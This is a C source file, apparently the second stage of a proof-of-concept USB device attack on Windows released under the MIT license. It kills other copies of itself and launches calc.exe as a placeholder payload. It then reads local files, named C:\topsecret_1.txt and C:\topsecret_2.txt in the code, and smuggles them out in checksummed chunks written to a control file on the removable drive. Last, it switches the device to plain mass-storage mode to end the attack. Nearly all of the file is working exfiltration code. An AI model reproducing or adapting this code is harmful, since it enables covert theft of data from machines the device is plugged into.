// This is an open source non-commercial project. Dear PVS-Studio, please check it.
// PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com

/*
stage2 - MIT License - Copyright 2020
-
David Reguera Garcia aka Dreg - dreg@fr33project.org
-
http://www.rootkit.es/
http://github.com/David-Reguera-Garcia-Dreg/
http://www.fr33project.org/
-
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
IN THE SOFTWARE.

WARNING! this is a POC, the code is CRAP
*/

#include "com.h"
#include <stdio.h>
#define COMSRC // ONLY DEFINE THIS ONE TIME IN THE FULL PROJECT, THE OTHERS MUST BE USED ONLY: #include <comsrc.h>
#include <comsrc.h>
#include <windows.h>
#include <tlhelp32.h>

char curr_dir[MAX_PATH];
char cmdex[MAX_PATH * 2];

void get_and_reset_packet_nr(uint32_t* nr_packets)
{
    FILE* file;

    do
    {
        printf("trying get and reset packet nr\n");
        file = fopen(cmdex, "rb+");
        if (NULL != file)
        {
            puts("get and reset packet nr ....");
            fseek(file, 0L, SEEK_SET);
            fwrite(RSTPKT_STR, sizeof(RSTPKT_STR) - 1, 1, file);
            fflush(file);
            fclose(file);
            puts("trying invalidate windows read cache...");
            Sleep(5000);
            invalidate_fat_cache_method1(cmdex[0]);
            Sleep(5000);
            invalidate_fat_cache_method2(cmdex[0]);
            Sleep(5000);
            do
            {
                puts("checking if invalidate works...");
                file = fopen(cmdex, "rb");
                if (NULL != file)
                {
                    char rdbf[6] = { 0 };
                    fread(rdbf, sizeof(rdbf), 1, file);
                    if (R_FILE_RESETWORKS_FLAG == rdbf[0])
                    {
                        puts("invalidation of windows cache read works!!");
                        fclose(file);
                        *nr_packets = *((uint32_t*)(rdbf + 1));
                        return;
                    }
                    else
                    {
                        Sleep(3000);
                    }
                    fclose(file);
                }
                else
                {
                    Sleep(3000);
                }
            } while (1);
        }
        else
        {
            perror(cmdex);
            Sleep(3000);
        }
    } while (1);
}

void ExfBlk(unsigned char* sect, unsigned int id, size_t chnk_sz)
{
    FILE* file;

    do
    {
        printf("trying open file to exfiltrating chunk.... 0x%x\n", id);
        file = fopen(cmdex, "rb+");
        if (NULL != file)
        {
            puts("exfiltrating block ....");
            fseek(file, 0L, SEEK_SET);
            fwrite(sect, chnk_sz, 1, file);
            fflush(file);
            fclose(file);

            break;
        }
        else
        {
            perror(cmdex);
            Sleep(3000);
        }
    } while (1);
}

void ConvertToOnlyMass(void)
{
    FILE* file;

    do
    {
        printf("trying open file to end attack\n");
        file = fopen(cmdex, "rb+");
        if (NULL != file)
        {
            puts("converting to only mass storage ....");
            fseek(file, 0L, SEEK_SET);
            fwrite(MASTR_STR, sizeof(MASTR_STR) - 1, 1, file);
            fflush(file);
            fclose(file);
            do
            {
                puts("checking if i am in only mass storage stage...");
                file = fopen(cmdex, "rb");
                if (NULL != file)
                {
                    char rdbf[4] = { 0 };
                    fread(rdbf, 2, 1, file);
                    if (R_FILE_STAGEONLYMASS_FLAG == rdbf[0])
                    {
                        puts("only mass storage stage started!!");
                        return;
                    }
                    else
                    {
                        Sleep(3000);
                    }
                    fclose(file);
                }
                else
                {
                    Sleep(3000);
                }
            } while (1);
        }
        else
        {
            perror(cmdex);
            Sleep(3000);
        }
    } while (1);
}

BOOL TerminateMyProcess(DWORD dwProcessId, UINT uExitCode)
{
    DWORD dwDesiredAccess = PROCESS_TERMINATE;
    BOOL  bInheritHandle = FALSE;
    HANDLE hProcess = OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
    if (hProcess == NULL)
    {
        return FALSE;
    }

    BOOL result = TerminateProcess(hProcess, uExitCode);

    CloseHandle(hProcess);

    return result;
}

BOOL kill_others(void)
{
    HANDLE hProcessSnap;
    HANDLE hProcess;
    PROCESSENTRY32 pe32;
    DWORD dwPriorityClass;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        return (FALSE);
    }

    // Set the size of the structure before using it.
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process,
    // and exit if unsuccessful
    if (!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);  // clean the snapshot object
        return (FALSE);
    }

    // Now walk the snapshot of processes
    do
    {
        if (_wcsicmp(D_FILE_NAMEW, pe32.szExeFile) == 0)
        {
            if (GetCurrentProcessId() != pe32.th32ProcessID)
            {
                TerminateMyProcess(pe32.th32ProcessID, 1);
            }
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return (TRUE);
}

bool exfill_block(EXFL_BLK_t* exfl_blk)
{
    FILE* r_file = fopen(cmdex, "rb+");
    if (NULL == r_file)
    {
        return false;
    }

    fseek(r_file, 0L, SEEK_SET);

    printf("\n"
           "exfstr: %s\n"
           "fileid: %d\n"
           "curr_block_nr: %d\n"
           "last_block: %d\n",
           exfl_blk->exfstr,
           exfl_blk->fileid,
           exfl_blk->curr_block_nr,
           exfl_blk->last_block);

    printf("data:\n");
    for (int i = 0; i < sizeof(exfl_blk->data); i++)
    {
        printf("0x%02X ", exfl_blk->data[i]);
        if ((i + 1) % 5 == 0)
        {
            printf("    %c%c%c%c%c",
                   isprint(exfl_blk->data[i - 4]) ? exfl_blk->data[i - 4] : '.',
                   isprint(exfl_blk->data[i - 3]) ? exfl_blk->data[i - 3] : '.',
                   isprint(exfl_blk->data[i - 2]) ? exfl_blk->data[i - 2] : '.',
                   isprint(exfl_blk->data[i - 1]) ? exfl_blk->data[i - 1] : '.',
                   isprint(exfl_blk->data[i]) ? exfl_blk->data[i] : '.');
            printf("\n");
        }
    }
    puts("\n-\n");

    fwrite(exfl_blk, sizeof(*exfl_blk), 1, r_file);

    fflush(r_file);

    fclose(r_file);

    Sleep(10000);

    return true;
}

bool exfill_file(char* file_name)
{
    FILE* file = fopen(file_name, "rb");
    EXFL_BLK_t exfl_blk = { 0 };
    if (NULL == file)
    {
        perror(file_name);
        return false;
    }
    printf("\nexfiltrating: %s\n\n", file_name);
    fseek(file, 0L, SEEK_SET);

    strcpy(exfl_blk.exfstr, EXFBLK_STR);
    exfl_blk.fileid = (uint32_t)time(NULL);

    uint32_t size_file = 0;
    uint32_t byrd = 0;
    uint32_t adler32 = 1;
    uint32_t total_packets = 0;
    while ((byrd = fread(exfl_blk.data, 1, sizeof(exfl_blk.data), file)) > 0)
    {
        size_file += byrd;
        adler32 = update_adler32(adler32, exfl_blk.data, sizeof(exfl_blk.data));
        exfill_block(&exfl_blk);
        exfl_blk.curr_block_nr++;
        memset(exfl_blk.data, 0, sizeof(exfl_blk.data));
        total_packets++;
    }

    // very buggy
    memset(exfl_blk.data, 0, sizeof(exfl_blk.data));
    exfl_blk.last_block = true;
    LAST_BLOCK_DATA_t* lst = (LAST_BLOCK_DATA_t*)exfl_blk.data;
    lst->adler32_full_blocks = adler32;
    lst->size_file = size_file;
    strncpy(lst->tag_name, file_name, sizeof(lst->tag_name) - 1);
    printf("\n"
           "lst->adler32_full_blocks: 0x%08X\n"
           "lst->size_file: %d\n"
           "lst->tag_name: %s\n",
           lst->adler32_full_blocks,
           lst->size_file,
           lst->tag_name);

    exfill_block(&exfl_blk);

    fclose(file);

    total_packets++;
    uint32_t nr_packet_sended = 0;
    get_and_reset_packet_nr(&nr_packet_sended);

    printf("\nnr packets sended: %d, total packets written: %d\n", nr_packet_sended,
           total_packets);

    return false;
}

int stage2(int argc, char* argv[])
{
    HANDLE hMutexHandle;

    puts("\n-\n"
         "stage2 (MIT LICENSE) by David Reguera Garcia aka Dreg - dreg@fr33project.org\n"
         "http://www.fr33project.org - https://github.com/David-Reguera-Garcia-Dreg\n"
         "-\n");

    //goto hack;

    hMutexHandle = CreateMutexW(NULL, FALSE, STAGE2_MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        return 0;
    }

    get_cmdex_shex_curr_dir(cmdex, NULL, curr_dir);

    puts(cmdex);
    puts(curr_dir);

    for (int i = 0; i < 3; i ++)
    {
        kill_others();
        Sleep(1000);
    }

    puts("\n\nDOING MALICIOUS THINGS... EXECUTING A CALC.EXE\n");

    system("calc.exe");

    FILE* file = NULL;
    FILE* hfile = NULL;
    unsigned char rdbf[3] = { 0 };
    do
    {
        puts("trying to start EXFILTRATE STAGE....");
        file = fopen(cmdex, "rb+");
        if (NULL != file)
        {
            fwrite(EXFIL_STR, sizeof(EXFIL_STR), 1, file);
            fflush(file);
            fclose(file);
            do
            {
                puts("checking if i am in EXFILTRATE STAGE...");
                hfile = fopen(cmdex, "rb");
                if (NULL != hfile)
                {
                    fread(rdbf, 2, 1, hfile);
                    if (R_FILE_STAGEEXFILL_FLAG == rdbf[0])
                    {
                        puts("exfiltrate stage started!!");
                        goto exfstg;
                    }
                    else
                    {
                        Sleep(3000);
                    }
                    fclose(hfile);
                }
                else
                {
                    Sleep(3000);
                }
            } while (1);
        }
        else
        {
            perror(cmdex);
            Sleep(3000);
        }
    } while (1);

exfstg:
    puts("\nexfiltrating info..., wait 10 secs...");

    Sleep(10000);

//hack: strcpy(cmdex, "E:\\r");

    exfill_file("C:\\topsecret_1.txt");
    exfill_file("C:\\topsecret_2.txt");
    //goto hack;

    puts("\ninfo exfiltrate!! end of attack... converting to only mass storage");
    Sleep(15000);
    ConvertToOnlyMass();

    puts("\nSUCCESS! good bye!!\n");

    puts("\nclosing in 10 secs...");
    Sleep(10000);

    return 0;
}

int main(int argc, char* argv[])
{
    int retf;

    puts("stage2\n");
    retf = stage2(argc, argv);

    puts("\nPRESS ENTER TO EXIT\n");
    getchar();

    return retf;
}